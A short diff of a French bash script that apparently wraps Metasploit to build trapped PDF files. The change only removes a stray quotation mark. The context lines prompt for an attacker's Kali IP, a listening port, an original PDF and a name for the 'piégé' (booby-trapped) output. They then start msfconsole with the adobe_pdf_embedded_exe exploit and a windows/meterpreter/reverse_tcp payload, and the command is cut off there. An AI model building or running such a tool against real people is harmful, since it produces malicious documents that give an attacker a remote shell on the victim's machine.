@@ -32,7 +32,7 @@ case $choice in
     read -p "[*] Entrez l'IP de votre machine Kali : " LHOST
     read -p "[*] Entrez le port d'écoute : " LPORT
     read -p "[*] Nom du fichier PDF original (ex: doc.pdf) : " INFILENAME
-    read -p "[*] Nom du fichier final piégé : " FILENAME"
+    read -p "[*] Nom du fichier final piégé : " FILENAME
 
     msfconsole -q -x "use exploit/windows/fileformat/adobe_pdf_embedded_exe;
     set payload windows/meterpreter/reverse_tcp;
